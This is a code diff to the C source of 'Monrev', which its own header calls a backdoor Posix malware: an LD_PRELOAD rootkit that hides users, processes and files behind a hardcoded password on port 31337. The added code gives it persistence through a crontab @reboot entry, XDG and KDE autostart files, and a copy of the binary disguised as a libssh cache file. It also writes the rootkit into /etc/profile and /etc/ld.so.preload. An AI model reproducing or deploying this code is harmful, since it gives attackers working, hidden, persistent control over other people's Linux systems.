@@ -1,3 +1,15 @@
+/**
+ * @file mr.c
+ * @author Gris Iscomeback
+ * @brief A backdoor Posix malware to hide users, processes, directories, and files.
+ *
+ * @details This posix malware intercepts various system calls to hide specific users,
+ * processes, directories, and files. It is designed to be loaded using LD_PRELOAD.
+ *
+ * @tested_on Kernel: 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ * @name Monrev
+ * @malware_type backdoor
+ **/
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -13,6 +25,8 @@
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <dlfcn.h>
+#include <sys/stat.h>
+#include <libgen.h>
 
 #define PORT 31337
 #define BUFFER_SIZE 1024
@@ -22,6 +36,7 @@
 #define HIDE_FILE "/dev/shm/file"
 #define KEY_FILE "/dev/shm/key"
 #define PASSWORD "grisiscomebacksayknokknok"
+#define PATH_MAX 4096
 
 typedef struct {
     char *command;
@@ -67,9 +82,17 @@ Command commands[] = {
 char *get_ld_preload() {
     return getenv("LD_PRELOAD");
 }
-void set_ld_preload(const char *value) {
-    if (setenv("LD_PRELOAD", value, 1) != 0) {
-        perror("setenv");
+void set_ld_preload(const char *ld_preload) {
+    FILE *profile = fopen("/etc/profile", "a");
+    if (profile) {
+        fprintf(profile, "export LD_PRELOAD=%s\n", ld_preload);
+        fclose(profile);
+    }
+
+    FILE *ld_preload_file = fopen("/etc/ld.so.preload", "a");
+    if (ld_preload_file) {
+        fprintf(ld_preload_file, "%s\n", ld_preload);
+        fclose(ld_preload_file);
     }
 }
 void ensure_ld_preload() {
@@ -107,6 +130,124 @@ void ensure_pid_file_exists() {
         fclose(file);
     }
 }
+
+int check_elevate() {
+    if (geteuid() == 0) {
+        printf("[CheckElevate] Running as ROOT\n");
+        return 1;
+    }
+    printf("[CheckElevate] Running as USER\n");
+    return 0;
+}
+
+void write_file(const char *path, const char *content, mode_t mode) {
+    FILE *file = fopen(path, "w");
+    if (file == NULL) {
+        perror("Failed to open file");
+        return;
+    }
+    fprintf(file, "%s", content);
+    fclose(file);
+    chmod(path, mode);
+}
+
+void crontab(const char *path) {
+    const char *tmp_path = "/tmp/crontab_tmp";
+    char command[PATH_MAX];
+    snprintf(command, sizeof(command), "@reboot %s\n", path);
+    write_file(tmp_path, command, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+
+    snprintf(command, sizeof(command), "crontab %s", tmp_path);
+    system(command);
+
+    remove(tmp_path);
+}
+
+char *generate_random_string() {
+    srand(time(NULL));
+    char *str = malloc(9);
+    for (int i = 0; i < 8; i++) {
+        str[i] = 'a' + rand() % 26;
+    }
+    str[8] = '\0';
+    return str;
+}
+
+void xdg(const char *path, int admin) {
+    char *filename = generate_random_string();
+    char conf[PATH_MAX];
+    char desktop_path[PATH_MAX];
+
+    snprintf(conf, sizeof(conf),
+             "[Desktop Entry]\n"
+             "Type=Application\n"
+             "Name=%s\n"
+             "Exec=%s\n"
+             "Terminal=false", filename, path);
+
+    if (admin) {
+        snprintf(desktop_path, sizeof(desktop_path), "/etc/xdg/autostart/%s.desktop", filename);
+    } else {
+        snprintf(desktop_path, sizeof(desktop_path), "%s/.config/autostart/%s.desktop", getenv("HOME"), filename);
+    }
+
+    write_file(desktop_path, conf, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
+    free(filename);
+}
+
+void kde_plasma(const char *path) {
+    char *filename = generate_random_string();
+    char script_path[PATH_MAX];
+
+    snprintf(script_path, sizeof(script_path), "%s/.config/autostart-scripts/%s.sh", getenv("HOME"), filename);
+
+    const char *content = "#!/bin/sh\n"
+                          "exec %s";
+    char full_content[PATH_MAX];
+    snprintf(full_content, sizeof(full_content), content, path);
+
+    write_file(script_path, full_content, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH | S_IXUSR | S_IXGRP | S_IXOTH);
+    free(filename);
+}
+
+void copy_binary(const char *source, const char *destination) {
+    FILE *src = fopen(source, "rb");
+    FILE *dest = fopen(destination, "wb");
+    if (src == NULL || dest == NULL) {
+        perror("Failed to open file");
+        return;
+    }
+
+    char buffer[1024];
+    size_t bytesRead;
+    while ((bytesRead = fread(buffer, 1, sizeof(buffer), src)) > 0) {
+        fwrite(buffer, 1, bytesRead, dest);
+    }
+
+    fclose(src);
+    fclose(dest);
+    chmod(destination, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH | S_IXUSR | S_IXGRP | S_IXOTH);
+}
+
+void persist(const char *path) {
+    int elevated = check_elevate();
+    if (elevated) {
+        xdg(path, 1);
+        crontab(path);
+        kde_plasma(path);
+    } else {
+        xdg(path, 0);
+        crontab(path);
+        kde_plasma(path);
+    }
+    char new_path[PATH_MAX];
+    snprintf(new_path, sizeof(new_path), "%s/.cache/libssh/libssh", getenv("HOME"));
+    mkdir(dirname(new_path), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
+    copy_binary(path, new_path);
+}
+
+
+
 void ensure_key_file_exists() {
     const char *filepath = KEY_FILE;
     FILE *file = fopen(filepath, "r");
@@ -144,20 +285,18 @@ void ensure_hide_file_exists() {
     }
 }
 void infect_command() {
-
+    const char *path;
+    char buf[PATH_MAX];
+    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf)-1);
+    if (len != -1) {
+        buf[len] = '\0';
+        path = buf;
+    } else {
+        perror("readlink");
+        return;
+    }
+    persist(path);
     set_ld_preload(DESIRED_LD_PRELOAD);
-
-    FILE *profile = fopen("/etc/profile", "a");
-    if (profile) {
-        fprintf(profile, "export LD_PRELOAD=%s\n", DESIRED_LD_PRELOAD);
-        fclose(profile);
-    }
-
-    FILE *ld_preload = fopen("/etc/ld.so.preload", "a");
-    if (ld_preload) {
-        fprintf(ld_preload, "%s\n", DESIRED_LD_PRELOAD);
-        fclose(ld_preload);
-    }
 }
 void load_rootkit() {
     if (rootkit_handle == NULL) {
